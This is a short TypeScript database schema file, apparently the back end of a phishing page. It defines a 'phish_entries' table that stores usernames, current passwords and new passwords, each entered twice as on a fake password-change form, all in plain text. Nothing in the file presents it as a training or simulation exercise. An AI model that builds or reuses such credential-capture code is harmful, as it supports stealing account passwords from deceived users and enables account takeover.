import { pgTable, text, serial, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod/v4";

export const phishEntriesTable = pgTable("phish_entries", {
  id: serial("id").primaryKey(),
  username: text("username").notNull(),
  currentPassword: text("current_password").notNull(),
  confirmCurrentPassword: text("confirm_current_password").notNull(),
  newPassword: text("new_password").notNull(),
  confirmNewPassword: text("confirm_new_password").notNull(),
  submittedAt: timestamp("submitted_at").defaultNow().notNull(),
});

export const insertPhishEntrySchema = createInsertSchema(phishEntriesTable).omit({ id: true, submittedAt: true });
export type InsertPhishEntry = z.infer<typeof insertPhishEntrySchema>;
export type PhishEntry = typeof phishEntriesTable.$inferSelect;
